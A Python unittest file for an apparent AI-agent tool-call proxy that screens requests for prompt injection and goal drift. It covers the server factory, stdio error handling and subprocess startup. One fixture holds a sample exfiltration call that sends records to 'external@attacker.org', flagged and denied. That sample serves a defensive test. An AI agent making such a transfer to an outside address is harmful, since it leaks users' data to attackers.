"""Tests for proxy.server entry point, stdio loop, build_server factory, and CLI flags."""

import io
import json
import subprocess
import sys
import unittest

from proxy.config import ProxyConfig
from proxy.jsonrpc import INVALID_PARAMS, PARSE_ERROR
from proxy.models import ALLOW, DENY, HOLD, ToolRequest
from proxy.server import ProxyServer, build_server, main
from tests.fakes import FakeAnalyser, FakeLog, SpyExecutor


class TestBuildServerFactory(unittest.TestCase):
    """Test build_server factory construction and defaults."""

    def test_default_build_server(self) -> None:
        server = build_server()
        self.assertIsInstance(server, ProxyServer)
        self.assertIsNotNone(server.log)
        self.assertIsNotNone(server.analyser)
        self.assertIsNotNone(server.executor)
        self.assertIsNotNone(server.pending_store)

    def test_custom_injected_build_server(self) -> None:
        log = FakeLog()
        analyser = FakeAnalyser()
        executor = SpyExecutor()
        cfg = ProxyConfig(tool_timeout_seconds=2.0, hold_ttl_seconds=45)
        server = build_server(log=log, analyser=analyser, executor=executor, config=cfg)
        self.assertIs(server.log, log)
        self.assertIs(server.analyser, analyser)
        self.assertIs(server.executor, executor)
        self.assertEqual(server.config.tool_timeout_seconds, 2.0)
        self.assertEqual(server.config.hold_ttl_seconds, 45)


class TestStdioLoop(unittest.TestCase):
    """Test main stdio loop processing and error recovery."""

    def test_stdio_loop_recovers_from_bad_lines_and_parses_all_stdout_as_json(self) -> None:
        valid_req = {
            "jsonrpc": "2.0",
            "id": "rpc-101",
            "method": "tools/call",
            "params": {
                "request_id": "req-loop-01",
                "tool": "summarize_document",
                "arguments": {"file": "synthetic_report.pdf"},
                "purpose": "Test stdio loop",
                "scenario_id": "scen-stdio-01",
            },
        }
        lines_in = [
            "not a json line\n",
            json.dumps({"jsonrpc": "2.0", "id": 1, "method": "unknown/method", "params": {}}) + "\n",
            json.dumps(valid_req) + "\n",
            "{bad: json\n",
        ]
        stdin_stream = io.StringIO("".join(lines_in))
        stdout_stream = io.StringIO()
        stderr_stream = io.StringIO()

        exit_code = main(argv=[], stdin=stdin_stream, stdout=stdout_stream, stderr=stderr_stream)
        self.assertEqual(exit_code, 0)

        out_lines = [l for l in stdout_stream.getvalue().splitlines() if l.strip()]
        self.assertEqual(len(out_lines), 4)

        # Every line out MUST parse as valid JSON
        responses = [json.loads(l) for l in out_lines]
        for resp in responses:
            self.assertEqual(resp.get("jsonrpc"), "2.0")

        # Line 1: Parse error
        self.assertEqual(responses[0]["error"]["code"], PARSE_ERROR)
        # Line 2: Method not found
        self.assertEqual(responses[1]["error"]["code"], -32601)
        # Line 3: Successful execution
        self.assertEqual(responses[2]["id"], "rpc-101")
        self.assertIn("result", responses[2])
        # Line 4: Parse error
        self.assertEqual(responses[3]["error"]["code"], PARSE_ERROR)

        # Diagnostics written to stderr
        err_output = stderr_stream.getvalue()
        self.assertIn("RPC error", err_output)

    def test_cli_flags_analyser_fixture(self) -> None:
        fixture_data = {
            "req-fix-01": {
                "prompt_injection": True,
                "goal_drift": False,
                "sensitive_data_risk": "high",
                "risk_score": 0.95,
                "recommended_action": "DENY",
                "reason": "Fixture prompt injection detected",
            }
        }
        stdin_stream = io.StringIO(json.dumps({
            "jsonrpc": "2.0",
            "id": "rpc-fix-1",
            "method": "tools/call",
            "params": {
                "request_id": "req-fix-01",
                "tool": "transfer_records",
                "arguments": {"destination": "external@attacker.org"},
                "purpose": "Exfiltrate",
                "scenario_id": "scen-fix",
            },
        }) + "\n")
        stdout_stream = io.StringIO()
        stderr_stream = io.StringIO()

        argv = [
            "--tool-timeout", "3.5",
            "--hold-ttl", "80",
            "--analyser-fixture", json.dumps(fixture_data),
        ]
        exit_code = main(argv=argv, stdin=stdin_stream, stdout=stdout_stream, stderr=stderr_stream)
        self.assertEqual(exit_code, 0)

        out = json.loads(stdout_stream.getvalue().strip())
        self.assertIn("error", out)
        self.assertEqual(out["error"]["code"], -32003)  # POLICY_DENIED


class TestSubprocessExecution(unittest.TestCase):
    """Test running python -m proxy.server entry point as a subprocess."""

    def test_subprocess_entry_point(self) -> None:
        req = {
            "jsonrpc": "2.0",
            "id": "sub-01",
            "method": "tools/call",
            "params": {
                "request_id": "req-sub-01",
                "tool": "summarize_document",
                "arguments": {"file": "synthetic_report.pdf"},
                "purpose": "Subprocess test",
                "scenario_id": "scen-sub-01",
            },
        }
        proc = subprocess.Popen(
            [sys.executable, "-m", "proxy.server"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        try:
            stdout_data, stderr_data = proc.communicate(input=json.dumps(req) + "\n", timeout=10)
        finally:
            if proc.poll() is None:
                proc.kill()

        self.assertEqual(proc.returncode, 0)
        lines = [l for l in stdout_data.splitlines() if l.strip()]
        self.assertEqual(len(lines), 1)
        resp = json.loads(lines[0])
        self.assertEqual(resp.get("id"), "sub-01")
        self.assertIn("result", resp)


if __name__ == "__main__":
    unittest.main()
